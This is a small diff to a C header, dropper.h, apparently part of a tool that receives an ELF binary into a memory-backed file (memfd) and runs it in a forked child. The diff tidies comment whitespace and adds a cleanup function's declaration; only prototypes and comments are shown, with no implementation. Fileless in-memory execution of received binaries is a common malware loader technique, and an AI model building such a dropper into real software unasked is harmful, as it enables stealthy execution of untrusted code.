@@ -15,21 +15,28 @@ typedef struct {
  * N bytes  : file contents
  *
  * On success, returns 0 and a memfd positioned at offset 0.
- * 
- * @param dropper_ctx 
- * @return int 
+ *
+ * @param dropper_ctx
+ * @return int
  */
 int dropper_receive(dropper_context_t *dropper_ctx);
 
 /**
  * @brief Run the memfd ELF received by dropper_receive.
- * 
+ *
  * Function automatically forks and runs the ELF in a child.
  * Child will be automatically reaped by kernel.
- * 
- * @param dropper_ctx 
- * @return int 
+ *
+ * @param dropper_ctx
+ * @return int
  */
 int dropper_run(dropper_context_t *dropper_ctx);
+
+/**
+ * @brief Closes memfd.
+ *
+ * @param dropper_ctx
+ */
+void dropper_cleanup(dropper_context_t *dropper_ctx);
 
 #endif /* __DROPPER_H */
